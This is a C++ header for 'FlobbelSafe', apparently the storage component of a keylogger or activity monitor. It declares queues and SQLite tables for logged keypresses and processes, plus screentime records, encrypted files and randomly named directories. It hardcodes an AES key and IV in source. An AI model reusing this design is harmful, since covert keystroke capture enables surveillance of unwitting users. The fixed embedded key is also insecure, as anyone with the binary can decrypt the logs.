//
// Created by Chrystalkey on 01.07.2019.
//

#ifndef FLOBBEL_FLOBBELSAFE_H
#define FLOBBEL_FLOBBELSAFE_H

#include <fstream>
#include <queue>
#include <string>
#include <random>
#include <thread>

#include "../dependencies/cryptopp/include/osrng.h"
#include "../dependencies/cryptopp/include/aes.h"
#include "../dependencies/cryptopp/include/modes.h"
#include "../dependencies/cryptopp/include/filters.h"

#include "../dependencies/sqlite/sqlite3.h"

#include "../FlobbelBackbone/global_functions.h"

static const CryptoPP::byte _key[32] = {
        0xEF,0x46,0x94,0x5A,0x73,0xCE,0x2A,0xCF,
        0x97,0xD4,0x39,0x67,0x81,0x56,0x8C,0x06,
        0x0F,0x8A,0x6E,0x33,0xBC,0xFE,0xAB,0xBE,
        0x9A,0x22,0xA1,0xF7,0xA5,0x29,0x35,0xFD
};
static const CryptoPP::byte _iv[16] = {
        0x9E,0x9B,0x6A,0x8B,0xCF,0xB8,0x48,0x5F,
        0x6D,0xB8,0xD0,0x42,0x89,0x12,0xD3,0x2F
};

class FlobbelSafe {
public:
    explicit FlobbelSafe(std::wstring &_safedir);
    ~FlobbelSafe();
    void save(const Info& info, FlobConstants::InfoType it);
private:
    void add_key(const KeypressInfo &);
    void add_prc(const ProcessInfo &);
    void add_screentime(const Screentime &);
private:
    void finalize_queues();
    std::queue<std::wstring> keyQueue;
    std::queue<std::wstring> prcQueue;
private:
    void encrypt_file(const std::wstring &file);
    void decrypt_file(const std::wstring &file);
    std::vector<CryptoPP::byte> buffer;
private:
    void init_map();
    uint32_t hash(std::wstring &text);
    std::map<uint32_t, std::wstring> rnd_directories;
private:
    sqlite3 *dbcon;
    std::wstring keyTable, proTable;


public:
    void timer();
    void sync();
private:
    bool end_timer = false;
    std::thread *tmrThread = nullptr;
    std::random_device rd;
    std::mt19937_64 mt;
    std::uniform_int_distribution<uint32_t> dist;
};

#endif //FLOBBEL_FLOBBELSAFE_H
